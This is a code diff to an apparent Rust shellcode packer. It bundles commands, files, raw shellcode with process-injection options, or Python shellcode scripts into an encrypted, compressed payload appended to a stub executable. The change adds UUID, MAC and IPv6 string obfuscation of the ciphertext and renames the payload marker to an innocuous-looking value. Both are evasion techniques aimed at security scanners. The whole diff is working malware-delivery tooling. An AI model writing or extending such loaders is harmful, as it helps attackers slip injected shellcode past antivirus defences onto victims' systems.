@@ -6,7 +6,9 @@ use rand::{rngs::OsRng, RngCore};
 use std::fs;
 use std::path::{Path, PathBuf};
 
-const MARKER: &[u8] = b"RSPKv1\0";
+mod obfuscation;
+
+const MARKER: &[u8] = b"1024KB\0";
 
 fn read_stub(default_release_first: bool) -> Result<Vec<u8>, String> {
     let mut candidates: Vec<PathBuf> = Vec::new();
@@ -37,16 +39,16 @@ fn read_stub(default_release_first: bool) -> Result<Vec<u8>, String> {
     Err("读取Stub失败: 未找到 stub.exe，请先构建：cargo build -p stub --release".to_string())
 }
 
-pub fn pack_cmd(cmd: &str, out_path: &Path) -> Result<(), String> {
+pub fn pack_cmd(cmd: &str, out_path: &Path, obf_mode: &str) -> Result<(), String> {
     let mut payload = Vec::new();
     payload.extend_from_slice(b"CMD\0");
     payload.extend_from_slice(cmd.as_bytes());
-    pack_payload(payload, out_path)
+    pack_payload(payload, out_path, obf_mode)
 }
 
-pub fn pack_file(input_path: &Path, out_path: &Path) -> Result<(), String> {
+pub fn pack_file(input_path: &Path, out_path: &Path, obf_mode: &str) -> Result<(), String> {
     let input = fs::read(input_path).map_err(|e| format!("读取输入失败: {}", e))?;
-    pack_payload(input, out_path)
+    pack_payload(input, out_path, obf_mode)
 }
 
 pub fn pack_shellcode(
@@ -54,6 +56,7 @@ pub fn pack_shellcode(
     out_path: &Path,
     inj_mode: &str,
     remote_path: Option<&Path>,
+    obf_mode: &str,
 ) -> Result<(), String> {
     let sc = fs::read(sc_path).map_err(|e| format!("读取Shellcode失败: {}", e))?;
     let mut payload = Vec::new();
@@ -73,20 +76,20 @@ pub fn pack_shellcode(
     }
     payload.extend_from_slice(&(sc.len() as u32).to_le_bytes());
     payload.extend_from_slice(&sc);
-    pack_payload(payload, out_path)
+    pack_payload(payload, out_path, obf_mode)
 }
 
-pub fn pack_shellcode_py(py_path: &Path, out_path: &Path) -> Result<(), String> {
+pub fn pack_shellcode_py(py_path: &Path, out_path: &Path, obf_mode: &str) -> Result<(), String> {
     let script = fs::read_to_string(py_path).map_err(|e| format!("读取Python脚本失败: {}", e))?;
     let bytes = script.as_bytes();
     let mut payload = Vec::new();
     payload.extend_from_slice(b"PY\0");
     payload.extend_from_slice(&(bytes.len() as u32).to_le_bytes());
     payload.extend_from_slice(bytes);
-    pack_payload(payload, out_path)
+    pack_payload(payload, out_path, obf_mode)
 }
 
-fn pack_payload(payload: Vec<u8>, out_path: &Path) -> Result<(), String> {
+fn pack_payload(payload: Vec<u8>, out_path: &Path, obf_mode: &str) -> Result<(), String> {
     let compressed = zstd::encode_all(&payload[..], 3).map_err(|e| format!("压缩失败: {}", e))?;
     let stub = read_stub(true)?;
     let mut key = [0u8; 32];
@@ -99,13 +102,24 @@ fn pack_payload(payload: Vec<u8>, out_path: &Path) -> Result<(), String> {
         .encrypt(nonce, compressed.as_ref())
         .map_err(|_| "加密失败".to_string())?;
 
+    let ciphertext_len = ciphertext.len();
+
+    let (encoded_ct, flag) = match obf_mode {
+        "uuid" => (obfuscation::obfuscate(&ciphertext, "uuid")?, 1u32),
+        "mac" => (obfuscation::obfuscate(&ciphertext, "mac")?, 2u32),
+        "ipv6" => (obfuscation::obfuscate(&ciphertext, "ipv6")?, 3u32),
+        _ => (ciphertext, 0u32),
+    };
+
     let mut out = stub;
     out.extend_from_slice(MARKER);
+    out.extend_from_slice(&(flag).to_le_bytes());
     out.extend_from_slice(&(32u32).to_le_bytes());
     out.extend_from_slice(&key);
     out.extend_from_slice(&(12u32).to_le_bytes());
     out.extend_from_slice(&nonce_bytes);
-    out.extend_from_slice(&(ciphertext.len() as u64).to_le_bytes());
-    out.extend_from_slice(&ciphertext);
+    out.extend_from_slice(&(ciphertext_len as u64).to_le_bytes()); // Original Length
+    out.extend_from_slice(&(encoded_ct.len() as u64).to_le_bytes()); // Encoded/File Length
+    out.extend_from_slice(&encoded_ct);
     fs::write(out_path, &out).map_err(|e| format!("写入输出失败: {}", e))
 }
